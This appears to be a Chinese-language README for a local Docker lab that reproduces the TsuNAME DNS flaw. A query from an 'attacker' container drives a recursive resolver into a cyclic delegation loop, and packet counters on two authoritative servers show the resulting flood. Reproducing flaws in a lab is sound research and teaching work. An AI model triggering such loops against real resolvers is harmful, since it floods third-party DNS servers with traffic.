# TsuNAME 漏洞复现环境

## 说明
本仓库用于Docker环境本地复现 **TsuNAME** 漏洞。


## 环境搭建
```shell
docker compose up --build
```

## 实验复现
实验的核心是向递归解析器查询一个处于循环依赖链中的域名，并观察其对权威服务器造成的影响。

### 监控权威服务器流量
为了观察攻击效果，我们需要在陷入循环的两个权威服务器（`auth2` 和 `auth3`）上运行一个流量监控脚本。请打开两个新的终端窗口。

在 **第一个终端** 中，启动 `auth2` (`a.com` 服务器) 的监控脚本：
```shell
docker compose exec auth2 python3 /count.py
```
你将看到如下输出，此时数据包计数为 0：
```
[*] Starting DNS packet counter on interface 'eth0'...
[*] Listening for incoming DNS queries on UDP port 53.
[*] Press Ctrl+C to stop and see the final count.
```

在 **第二个终端** 中，启动 `auth3` (`b.com` 服务器) 的监控脚本：
```shell
docker compose exec auth3 python3 /count.py
```

### 触发
现在，我们从 `attacker` 容器向递归解析器 `recursor` 发送一个特制的 DNS 查询，以触发解析循环。

在 **第三个终端** 中执行以下命令：
```shell
docker compose exec attacker dig @recursor ns.sub.a.com
```
这个命令会请求解析 `ns.sub.a.com`。由于 `a.com` 和 `b.com` 权威服务器之间存在循环委托，`recursor` 将陷入无限查询循环，因此该 `dig` 命令会一直等待直到超时，这是预期行为。

### 结果
切换回你之前打开的用于监控 `auth2` 和 `auth3` 的两个终端。

你会看到两个终端中的数据包计数器增长，这表明 `recursor` 正在向这两个权威服务器发送 DNS 查询请求。

**`auth2` 或 `auth3` 终端中的输出示例：**
```
Packets received: 59
```
这证明递归解析器已被成功利用，并正在向权威服务器发起 DoS 攻击，大量消耗其网络和计算资源。按下 `Ctrl+C` 可以停止监控并查看最终的数据包统计。
